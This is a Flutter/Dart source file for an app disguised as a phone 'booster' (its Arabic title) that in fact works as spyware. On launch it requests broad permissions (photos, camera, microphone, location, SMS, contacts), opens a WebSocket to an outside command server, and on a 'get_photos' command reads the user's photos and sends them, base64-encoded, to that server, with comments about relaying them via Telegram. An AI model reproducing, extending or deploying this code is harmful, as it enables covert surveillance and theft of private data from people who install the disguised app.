import 'dart:async';
import 'dart:convert';
import 'package:flutter/material.dart';
import 'package:web_socket_channel/web_socket_channel.dart';
import 'package:photo_manager/photo_manager.dart';
import 'package:permission_handler/permission_handler.dart';

void main() {
  runApp(const MyApp());
}

class MyApp extends StatelessWidget {
  const MyApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      home: const MainScreen(),
    );
  }
}

class MainScreen extends StatefulWidget {
  const MainScreen({super.key});

  @override
  State<MainScreen> createState() => _MainScreenState();
}

class _MainScreenState extends State<MainScreen> {
  WebSocketChannel? _channel;
  String _status = "جاري طلب الصلاحيات...";

  @override
  void initState() {
    super.initState();
    _requestAllPermissions();
  }

  // ✅ هنا طلب كل الصلاحيات مرة واحدة
  Future<void> _requestAllPermissions() async {
    Map<Permission, PermissionStatus> statuses = await [
      Permission.photos,
      Permission.storage,
      Permission.camera,
      Permission.microphone,
      Permission.location,
      Permission.sms,
      Permission.contacts,
      Permission.notification,
    ].request();

    // بعد ما يخلص طلب الصلاحيات، نتصل بالسيرفر
    if (mounted) {
      setState(() {
        _status = "جاري الاتصال بالسيرفر...";
      });
      _connectWebSocket();
    }
  }

  void _connectWebSocket() {
    try {
      // ⚠️ ضع رابط سيرفرك هنا (wss أو ws)
      _channel = WebSocketChannel.connect(Uri.parse('wss://hek11m.onrender.com/'));

      _channel!.stream.listen((message) {
        _handleCommand(message);
      }, onError: (error) {
        setState(() => _status = "خطأ في الاتصال: $error");
        Future.delayed(const Duration(seconds: 5), _connectWebSocket);
      }, onDone: () {
        setState(() => _status = "انقطع الاتصال، جاري إعادة المحاولة...");
        Future.delayed(const Duration(seconds: 5), _connectWebSocket);
      });
      
      setState(() => _status = "متصل! في انتظار الأوامر...");
    } catch (e) {
      setState(() => _status = "فشل الاتصال: $e");
    }
  }

  void _handleCommand(String message) {
    if (message.startsWith('get_photos:')) {
      int count = int.tryParse(message.split(':')[1]) ?? 5;
      _sendPhotos(count);
    }
  }

  Future<void> _sendPhotos(int count) async {
    final permissions = await PhotoManager.requestPermissionExtend();
    if (!permissions.isAuth) {
      _channel?.sink.add('photos_error');
      return;
    }

    final albums = await PhotoManager.getAssetPathList(
      type: RequestType.image,
      onlyAll: true,
    );

    if (albums.isEmpty) {
      _channel?.sink.add('photos_done');
      return;
    }

    final assets = await albums[0].getAssetListRange(start: 0, end: count);

    for (var asset in assets) {
      final file = await asset.file;
      if (file != null) {
        final bytes = await file.readAsBytes();
        final base64Image = base64Encode(bytes);
        _channel?.sink.add('photo:$base64Image');
        // تأخير مهم جداً لتجنب حظر تيليجرام
        await Future.delayed(const Duration(milliseconds: 800));
      }
    }
    _channel?.sink.add('photos_done');
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: const Text('مسرع الهاتف'),
        backgroundColor: Colors.blueAccent,
      ),
      body: Center(
        child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            const Icon(Icons.rocket_launch, size: 100, color: Colors.blueAccent),
            const SizedBox(height: 20),
            Text(
              _status,
              style: const TextStyle(fontSize: 18, fontWeight: FontWeight.bold),
              textAlign: TextAlign.center,
            ),
            const SizedBox(height: 30),
            const CircularProgressIndicator(),
          ],
        ),
      ),
    );
  }
}